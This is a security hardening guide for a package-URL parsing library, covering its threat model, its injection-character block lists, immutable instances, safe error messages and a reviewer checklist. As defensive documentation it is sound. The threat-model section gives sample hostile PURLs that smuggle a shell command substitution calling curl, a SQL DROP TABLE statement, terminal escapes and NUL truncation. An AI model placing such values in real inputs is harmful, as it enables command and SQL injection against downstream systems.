# Hardening

How this library treats PURL strings as hostile input and refuses to
hand downstream consumers something that can hurt them. Read this
if you are touching `src/strings.ts`, `src/objects.ts`, `src/error.ts`,
or reviewing a PR that adds a new ecosystem handler.

## Who this is for

Contributors adding or reviewing code paths that read PURL input
from the outside (user text, CLI args, API payloads, file contents).
The rules here keep the library from being a confused deputy for a
caller with hostile intent.

## The stance

**Valid PURLs never throw. Hostile input never parses.**

That is the whole doctrine. Everything below is mechanics that turn
it into code.

A well-formed PURL (passes spec shape + no dangerous characters)
builds a frozen `PackageURL` instance the caller can rely on. An
ill-formed PURL throws a `PurlError`. An input that looks like it
wants to be interpreted twice — once as a PURL, and again by a
downstream consumer (shell, SQL, URL, log pipeline) — throws a
`PurlInjectionError` **before parse**. The caller never sees a
half-interpreted object.

## The threat model

We assume the attacker controls the PURL string. They may try to:

1. **Inject shell metacharacters** so a downstream caller that
   interpolates the PURL into a command executes something the
   caller didn't intend. Example:
   `pkg:npm/$(curl evil)/x@1`.
2. **Break out of a quoted context** so the PURL becomes argv
   splitting fodder or SQL quote-escape. Example:
   `pkg:npm/a";DROP TABLE pkgs;--/x@1`.
3. **Desync terminal / log parsers** with control characters, so a
   log-review tool renders attacker-controlled bytes as if they
   were tool output. Example: `pkg:npm/a\x1b[2Jb/x@1`.
4. **Smuggle invisible characters** (zero-width spaces, RLO
   overrides, BOM) so the rendered name looks like one package but
   resolves to another. Example: `pkg:npm/react​act@1`.
5. **Truncate** with NUL, so a PURL that looks harmless to a JS
   string parser gets half-read by a C library. Example:
   `pkg:npm/safe\x00evil@1`.
6. **Mutate a PackageURL** after it has been built, so a consumer
   downstream sees a different name than the one that was validated
   upstream.

This doc is how the library refuses all six.

## The first line: injection-character detection

`src/strings.ts` exports `isInjectionCharCode(code: number)`. It
returns `true` for any character code in one of four classes:

| Class                                        | Codes                                                                                                                                                              | Why                                                                                                   |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------- |
| **C0 control characters**                    | `0x00`–`0x1f`                                                                                                                                                      | NUL (truncation), TAB / LF / CR (log injection), ESC (terminal escape), everything else in that range |
| **Shell metacharacters + brackets + quotes** | `0x20` (space), `!`, `"`, `#`, `$`, `%`, `&`, `'`, `(`, `)`, `*`, `;`, `<`, `=`, `>`, `?`, `[`, `\`, `]`, `` ` ``, `{`, `\|` (pipe), `}`, `~`, DEL                 | Shell interpretation, SQL quote-escape, URL-fragment injection                                        |
| **C1 control characters**                    | `0x80`–`0x9f`                                                                                                                                                      | Legacy control bytes; some terminals still act on them                                                |
| **Unicode invisible/directional**            | `U+200B`–`U+200F`, `U+202A`–`U+202E`, `U+2060`, `U+FEFF`, `U+FFFC`, `U+FFFD`                                                                                        | Zero-width chars, bidi override characters (IDN-homograph attacks), BOM, object replacement           |

Any input containing one of these characters in a component where
we scan for injection throws `PurlInjectionError` before the
standard parse logic runs. The error names:

- Which **purl type** the component belongs to (`npm`, `maven`, …)
- Which **component** failed (`name`, `namespace`, …)
- The **char code** and a human-readable label

```typescript
class PurlInjectionError extends PurlError {
  readonly charCode: number
  readonly component: string
  readonly purlType: string
}
```

Callers who want to treat injection attempts as auditable events
(log, alert, rate-limit the source) can `catch` specifically for
`PurlInjectionError` and route those up while still handling
`PurlError` as "just a malformed PURL."

## The narrower scanner for freer contexts

Some PURL components (like version strings or URL-based qualifier
values) are legitimately allowed to carry characters that are
dangerous elsewhere — a URL qualifier value may contain `?`, `&`,
`=`, `:`, `/` as part of a normal URL. For those contexts
`src/strings.ts` exports a narrower scanner that only blocks the
characters that actually enable shell execution or code injection:
the control characters, the shell metacharacters (`|`, `&`, `;`,
`` ` ``, `$`, `<`, `>`, `(`, `)`, `{`, `}`, `\`), and quotes.

The choice between the broad and narrow scanner is the difference
between "this component should be a plain identifier" (use the
broad scanner; anything non-identifier is suspicious) and "this
component is a URL-shaped value" (use the narrow scanner; pass
through URL syntax).

## The second line: immutable instances

`src/objects.ts` exports `recursiveFreeze(value)`. Every
`PackageURL` instance runs through it at construction time:

- Top-level instance is `Object.freeze`-d.
- Qualifiers object is frozen.
- Any nested objects or arrays reachable from the instance are
  frozen.

That means a `PackageURL` you receive from a library call cannot be
mutated by a later code path:

```typescript
const purl = new PackageURL('npm', undefined, 'safe-pkg', '1.0.0')
purl.name = 'evil-pkg' // silently ignored (strict mode: throws)
purl.qualifiers.key = 'hax' // silently ignored (strict mode: throws)
```

This matters when a validated PURL is passed through 3+ hops — a
middle hop can't secretly modify the object and hand it to the next
hop. Validation up front + freeze means "validated" still means
something at the endpoint.

The freeze walk is **breadth-first** with a `WeakSet` for cycle
detection and a hard ceiling at one million nodes
(`LOOP_SENTINEL`). An adversary-constructed cyclic object cannot
loop the walker forever; a million-node object graph throws
`Error("Object graph too large…")` rather than OOM-ing the
process.

## The third line: error messages that don't leak

`src/error.ts`'s `formatPurlErrorMessage` normalizes every
user-visible error message:

- Lowercase the first letter (`Invalid → invalid`)
- Strip a trailing period
- Prefix with `Invalid purl:`

The normalization matters because error strings land in logs,
support tickets, and sometimes in HTTP responses. A consistent
shape:

- Is grep-able (every one starts with `Invalid purl:`).
- Never renders attacker-controlled bytes verbatim when injection is
  detected — the `PurlInjectionError` message says _the char label_
  (e.g. "SPACE", "NUL", "BACKTICK"), not the raw character, so a
  terminal that pipes the log never interprets an ESC sequence the
  attacker embedded.

## When to call what

| Situation                                                        | Use                                                                                                                      |
| ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Parsing a full PURL string from untrusted input                  | `new PackageURL(str)` — catches `PurlInjectionError` + `PurlError`                                                       |
| Validating a user-submitted PURL in a form                       | `PackageURL.fromStringResult(str)` — returns `Result`, collect failures                                                  |
| Building a PURL from already-trusted pieces (internal codepaths) | `new PackageURL(type, ns, name, version, qualifiers, subpath)` — still runs validation but you know the inputs are clean |
| Comparing two PURLs                                              | `purl.equals(other)` / `purl.matches(pattern)` — both ReDoS-safe                                                         |

For converter utilities (URL → PURL, PURL → URL) see
`docs/converters.md`; for the builder API see `docs/builders.md`.

## Red flags when reviewing a PR

If a PR touches PURL-component handling, pause if you see any of:

1. **Bypassing the injection scan.** A rule like "skip
   `isInjectionCharCode` for this type because the user won't ever
   put weird characters there" is exactly the kind of assumption
   that gets a library blamed for the next CVE. If the scan is
   expensive in a hot path, optimize the scan — never skip it.
2. **Unfreezing.** No `Object.freeze(purl, { writable: true })`.
   No cloning into a mutable shape unless it is a new instance
   being built from scratch. If you see code that hands back a
   mutable copy, call it out.
3. **Raw char interpolation in error messages.** Every
   `PurlInjectionError` is built from `charLabel`, not the raw
   character. If a new error message string-interpolates a
   suspect char directly, that message will render the char
   verbatim in someone's terminal later.
4. **Removing the `LOOP_SENTINEL` cap** on `recursiveFreeze` or
   bumping it to `Infinity`. The ceiling is the last line between a
   hostile cyclic object and process-wide OOM.
5. **Catching and swallowing `PurlInjectionError` silently.**
   Injection attempts are a signal, not noise. They deserve to
   propagate to the caller who can choose to log/alert/block.
6. **New ecosystem handler that doesn't use `PurlComponent`'s
   shared normalize/validate.** Every ecosystem inherits the
   injection scan via the shared components. An ad-hoc parser
   inside `src/purl-types/<x>.ts` bypasses that by default.

## What this library does **not** defend against

Be honest about scope:

- **Resource exhaustion.** A very long valid PURL will still be
  processed. We do not impose a max string length. Callers who
  accept PURLs from the wire should rate-limit and size-limit at
  the boundary.
- **Regex catastrophic backtracking in patterns you pass to us.**
  The library's own internal regexes are ReDoS-free (simple char
  scans), but if you pass a user-controlled pattern to
  `purl.matches(userPattern)`, validate that pattern yourself.
- **Typosquatting / ecosystem-level package confusion.** That is a
  policy problem at the package-registry layer (Socket's main
  product, in fact) — not a string-level check this library can
  make.
- **Crafted URLs in URL-converter inputs.** `urlConverter.fromUrl`
  trusts its input is a real URL string. Pass untrusted URLs
  through `new URL()` first.

If the caller's use case hits one of these, document it at the
boundary; don't try to push it into the library.

## Checklist for adding a new ecosystem handler

- [ ] Handler file at `src/purl-types/<name>.ts`.
- [ ] `normalize`, `validate` rules use the shared `PurlComponent`
      helpers — no ad-hoc parsing.
- [ ] Any custom check calls `isInjectionCharCode` (or the narrower
      command-execution scanner) before other logic.
- [ ] Tests include at least one case per injection class (shell
      char, control char, unicode invisible) — expect
      `PurlInjectionError`.
- [ ] No mutation of the PURL instance after construction.
- [ ] No catch-and-swallow of `PurlInjectionError`.
- [ ] Error messages use `charLabel`, never raw chars.
- [ ] Registered in `src/purl-type.ts`'s `knownTypes` map.
- [ ] `pnpm test` green, `pnpm cover` still at 100%.

## Further reading

- [`docs/architecture.md`](./architecture.md) — where these modules
  fit in the larger design.
- [`docs/api.md`](./api.md) — the full public API reference.
- [`docs/vers.md`](./vers.md) — version-range specifiers; also
  hostile-input territory.
- [`src/strings.ts`](../src/strings.ts) — `isInjectionCharCode` +
  narrower scanners.
- [`src/objects.ts`](../src/objects.ts) — `recursiveFreeze` +
  `LOOP_SENTINEL`.
- [`src/error.ts`](../src/error.ts) — `PurlError` +
  `PurlInjectionError` + `formatPurlErrorMessage`.
- [package-url/purl-spec](https://github.com/package-url/purl-spec) —
  the upstream spec this library implements.
